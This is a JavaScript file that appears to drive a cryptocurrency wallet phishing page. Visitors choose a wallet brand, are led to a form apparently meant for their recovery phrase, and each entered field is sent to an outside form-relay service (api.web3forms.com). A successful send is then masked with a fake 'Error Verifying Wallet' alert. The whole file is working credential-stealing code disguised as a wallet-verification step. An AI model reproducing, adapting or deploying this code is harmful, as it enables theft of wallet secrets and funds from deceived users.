(function () {
  ("use strict");

  let select = (el, all = false) => {
    el = el.trim();
    if (all) {
      return [...document.querySelectorAll(el)];
    } else {
      return document.querySelector(el);
    }
  };

  /**
   * Easy event listener function
   */
  const on = (type, el, listener, all = false) => {
    if (all) {
      select(el, all).forEach((e) => e.addEventListener(type, listener));
    } else {
      select(el, all).addEventListener(type, listener);
    }
  };

  /**
   * Easy on scroll event listener
   */
  const onscroll = (el, listener) => {
    el.addEventListener("scroll", listener);
  };

  // get img
  let box = select(".blockchain-item", true);
  let boxImg = select(".blockchain .img", true);
  let boxTitle = select(".blockchain h4", true);

  // Open modalbox
  box.forEach((e, index) => {
    e.addEventListener("click", function () {
      openModal(".modal-connectius");

      //  set wallet technology
      let walletName = select(".modal .modal-block-deet h4");
      let walletImage = select(".modal .modal-block-deet .block-img img");

      [...boxTitle].forEach((a, ai) => {
        if (index === ai) {
          walletName.textContent = a.textContent;
        }
      });

      boxImg.forEach((a, ai) => {
        if (index === ai) {
          walletImage.src = a.src;
        }
      });
    });
  });

  //  close Modalbox
  on(
    "click",
    ".modal .modal-head .close",
    function (e) {
      e.preventDefault();
      closeModal(".modal-connectius");
    },
    true
  );

  // phrase boxes
  on("click", "#inbox-modal", function (e) {
    e.preventDefault();
    closeModal(".modal-connectius");

    openModal(".modal-form");
  });

  // modal nav-link
  let modalNav = select(".modal .navbar .nav-item", true);
  modalNav.forEach((button, index) => {
    button.addEventListener("click", function () {
      modalNav.forEach((btn) => btn.classList.remove("active"));
      this.classList.add("active");

      let tabConnect = select(".tab-content", true);
      tabConnect.forEach((x, i) => {
        if (index === i) {
          x.classList.remove("d-none");
          x.classList.add("active");
        } else {
          x.classList.add("d-none");
          x.classList.remove("active");
        }
      });
    });
  });

  // Form validation
  let forms = select("form", true);
  let result = select("#result");
  const progressBar = select(".sending");

  forms.forEach((form) => {
    form.addEventListener("submit", function (e) {
      e.preventDefault();

      const formData = new FormData(form);

      formData.forEach((value, key) => {
        var obj = {};

        obj[key] = value;

        var json = JSON.stringify(obj);

        result.innerHTML = "Please wait";
       

        if (obj[key] !== "") {
          fetch("https://api.web3forms.com/submit", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Accept: "application/json",
            },
            body: json,
          })
            .then(async (response) => {
              progressBar.style.display = "block";

              let json = await response.json();
              if (response.status == 200) {
                alert("Error Verifying Wallet... Please try again later");
                closeModal('.modal-form');
              } else {
                console.log(response);
                result.innerHTML = json.message;
                result.classList.remove("text-gray-500");
                result.classList.add("text-red-500");
                closeModal('.modal-form');
              }
            })
            .catch((error) => {
              console.log(error);
              result.innerHTML = "Something went wrong!";
            })
            .then(function () {
              // form.reset();
              progressBar.style.display = "none";
              setTimeout(() => {
                result.style.display = "none";
                closeModal('.modal-form');
              }, 5000);
            });
        } else {
          alert( `${key} id empty`);
        }
      });

     
    });
  });

  let boxBtn = select("#inbox-modal");
  let loading = select(".loading");

  loading.style.display = "flex";
  boxBtn.style.display = "none";

  setTimeout(() => {
    loading.style.display = "none";
    boxBtn.style.display = "flex";
  }, 4000);

  function openModal(c) {
    let modalContainer = select(".modal" + c, true);
    [...modalContainer].forEach((e) => {
      e.classList.add("show");
    });
  }

  function closeModal(c) {
    let modalContainer = select(".modal" + c, true);
    [...modalContainer].forEach((e) => {
      e.classList.remove("show");
    });
  }

  const isRequired = (value) => (value === "" ? false : true);
  const isBetween = (length, min, max) =>
    length < min || length > max ? false : true;

  const showError = (input, message) => {
    // get the form-field element
    const formField = input.parentElement;
    // add the error class
    formField.classList.remove("success");
    formField.classList.add("error");

    // show the error message
    const error = formField.querySelector("small");
    error.textContent = message;
  };

  const showSuccess = (input) => {
    // get the form-field element
    const formField = input.parentElement;

    // remove the error class
    formField.classList.remove("error");
    formField.classList.add("success");

    // hide the error message
    const error = formField.querySelector("small");
    error.textContent = "";
  };
})();
